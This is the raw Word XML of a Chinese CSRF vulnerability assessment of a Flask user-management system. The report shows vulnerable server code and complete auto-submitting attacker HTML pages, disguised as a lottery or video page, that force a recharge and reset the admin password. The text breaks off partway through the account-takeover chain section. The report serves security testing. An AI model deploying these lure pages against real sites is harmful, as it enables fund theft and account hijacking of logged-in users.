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b/>
          <w:color w:val="1A3C6E"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>CSRF 跨站请求伪造漏洞检测报告</w:t>
        <w:br/>
        <w:t>Cross-Site Request Forgery</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>检测日期：2026年07月14日</w:t>
        <w:br/>
        <w:t>漏洞类型：CSRF / 跨站请求伪造 / Session劫持</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>目  录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>一、什么是CSRF漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>二、本次检测范围</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>三、漏洞汇总</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>四、漏洞1：充值接口CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>五、漏洞2：修改密码接口CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>六、漏洞3：注册接口CSRF（已修复）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>七、漏洞4：上传接口CSRF（已修复）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>八、攻击链演示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>九、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>十、安全建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>附录：POC代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、什么是CSRF漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种Web安全攻击方式，攻击者诱导已登录用户访问恶意页面，在用户不知情的情况下，利用用户的登录状态向目标网站发送伪造请求，执行非预期的操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 CSRF攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>用户A已登录目标网站（存在有效的Session Cookie）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>攻击者构造恶意页面，包含向目标网站提交表单的代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>用户A访问恶意页面 → 浏览器自动发送请求（携带Cookie）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>目标网站收到请求 → 验证Session有效 → 执行操作 → 攻击成功</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 CSRF与XSS的区别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对比项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CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>XSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>利用方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>伪造请求，利用用户身份</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>注入恶意脚本</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>受害对象</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>已登录用户</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>访问页面的任何用户</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>防护重点</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CSRF Token / SameSite Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>输入过滤 / 输出编码</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>二、本次检测范围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目标系统</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Flask用户管理系统</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>检测方法</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>遍历所有表单接口，检查CSRF Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>涉及接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>登录/注册/上传/充值/修改密码</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>检测结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>5个接口中3个已修复，2个存在漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>高危 - 可被利用进行资金盗取和账户劫持</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>系统中所有表单接口的CSRF防护状态：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接口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方法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CSRF Token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状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/login</w:t>
            </w:r>
          </w:p>
        </w:tc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有 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/register</w:t>
            </w:r>
          </w:p>
        </w:tc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有 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/upload</w:t>
            </w:r>
          </w:p>
        </w:tc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有 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/recharge</w:t>
            </w:r>
          </w:p>
        </w:tc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无 ❌</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>存在漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/change-password</w:t>
            </w:r>
          </w:p>
        </w:tc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无 ❌</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>存在漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、漏洞汇总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编号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漏洞名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>严重程度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攻击效果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CSRF-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>充值接口CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>致命</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>利用已登录用户身份进行资金操作</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CSRF-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>修改密码接口CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>致命</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>利用已登录用户身份修改密码，实现账户劫持</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、漏洞1：充值接口CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🔴 致命</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/recharge 接口没有 CSRF Token 保护，攻击者可以构造恶意页面，诱导已登录用户访问后自动提交充值表单，在用户不知情的情况下操控其账户。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 漏洞代码定位</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>服务端：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/recharge", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def recharge():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id = request.form.get("user_id", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    amount = request.form.get("amount", "0")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    USERS[uname]["balance"] += amount  # 直接执行！</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 没有验证 CSRF Token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>模板端：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- profile.html 充值表单 - 无CSRF Token --&gt;</w:t>
        <w:br/>
        <w:t>&lt;form method="POST" action="/recharge"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="user_id" value="{{ user_id }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="number" name="amount"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;button type="submit"&gt;立即充值&lt;/button&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;!-- ❌ 缺少 &lt;input type="hidden" name="csrf_token"&gt; --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 攻击场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击者构造以下恶意HTML页面，诱骗已登录管理员访问：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
        <w:br/>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;head&gt;&lt;title&gt;免费抽奖&lt;/title&gt;&lt;/head&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;h1&gt;恭喜获得iPhone抽奖资格！&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;p&gt;正在跳转...&lt;/p&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!-- 隐藏的CSRF攻击表单 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;form id="csrf_form" method="POST"</w:t>
        <w:br/>
        <w:t xml:space="preserve">          action="http://target/recharge"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;input type="hidden" name="user_id" value="3"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;input type="hidden" name="amount" value="10000"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        // 自动提交表单</w:t>
        <w:br/>
        <w:t xml:space="preserve">        document.getElementById("csrf_form").submit();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 攻击效果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>用户在看到"免费抽奖"页面时，浏览器已经在后台向目标系统发送了充值请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>如果用户已登录系统，请求携带有效的Session Cookie，充值操作成功执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>攻击者账户收到10000元，用户毫不知情</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、漏洞2：修改密码接口CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🔴 致命</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/change-password 接口没有 CSRF Token 保护，更没有验证原密码。攻击者可构造恶意页面，诱导已登录用户访问后自动提交修改密码表单，直接劫持用户的账户。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 漏洞代码定位</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>服务端：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/change-password", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def change_password():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 没有验证CSRF Token</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 没有验证原密码</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 没有验证Session身份</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username in USERS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        USERS[username]["password"] = generate...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>模板端：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- profile.html 修改密码表单 - 无CSRF Token --&gt;</w:t>
        <w:br/>
        <w:t>&lt;form method="POST" action="/change-password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="{{ user.username }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="password" name="new_password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;button type="submit"&gt;修改密码&lt;/button&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;!-- ❌ 缺少 &lt;input type="hidden" name="csrf_token"&gt; --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 攻击场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>结合之前的水平越权漏洞（AUTH-01），攻击者可以做到：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
        <w:br/>
        <w:t>&lt;html&gt;&lt;head&gt;&lt;title&gt;视频播放器&lt;/title&gt;&lt;/head&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;h2&gt;正在加载视频...&lt;/h2&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;video autoplay&gt;...&lt;/video&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!-- CSRF攻击：修改admin密码 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;form id="csrf_form" method="POST"</w:t>
        <w:br/>
        <w:t xml:space="preserve">          action="http://target/change-password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;input type="hidden" name="username"</w:t>
        <w:br/>
        <w:t xml:space="preserve">               value="admin"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;input type="hidden" name="new_password"</w:t>
        <w:br/>
        <w:t xml:space="preserve">               value="hacked_by_csrf"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        document.getElementById("csrf_form").submit();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;p&gt;请稍候，视频正在缓冲...&lt;/p&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 攻击效果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>CSRF攻击 → admin密码被改为 "hacked_by_csrf"</w:t>
        <w:br/>
        <w:t>→ 攻击者使用新密码登录 admin</w:t>
        <w:br/>
        <w:t>→ 查看所有用户资料</w:t>
        <w:br/>
        <w:t>→ 修改alice的密码</w:t>
        <w:br/>
        <w:t>→ 登录alice</w:t>
        <w:br/>
        <w:t>→ 为攻击者账户充值</w:t>
        <w:br/>
        <w:t>→ ✅ 完全控制所有账户！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、漏洞3：注册接口CSRF（已修复）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🟡 已修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注册接口在第二轮安全审计中已添加 CSRF Token 保护。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- register.html - 已修复 ✅ --&gt;</w:t>
        <w:br/>
        <w:t>&lt;form method="POST" action="/register"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="csrf_token"</w:t>
        <w:br/>
        <w:t xml:space="preserve">           value="{{ csrf_token() }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># app.py - CSRF验证</w:t>
        <w:br/>
        <w:t>csrf_input = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t>if not validate_csrf_token(csrf_input):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("register.html",</w:t>
        <w:br/>
        <w:t xml:space="preserve">                           error="会话已过期")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>七、漏洞4：上传接口CSRF（已修复）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🟡 已修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>上传接口在第二轮安全审计中已添加 CSRF Token 保护。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- upload.html - 已修复 ✅ --&gt;</w:t>
        <w:br/>
        <w:t>&lt;form method="POST" action="/upload"</w:t>
        <w:br/>
        <w:t xml:space="preserve">      enctype="multipart/form-data"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="csrf_token"</w:t>
        <w:br/>
        <w:t xml:space="preserve">           value="{{ csrf_token() }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>八、攻击链演示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>完整的 CSRF 攻击链：从诱导访问到完全控制系统</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段1：信息收集</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>1. 注册攻击者账户 attacker</w:t>
        <w:br/>
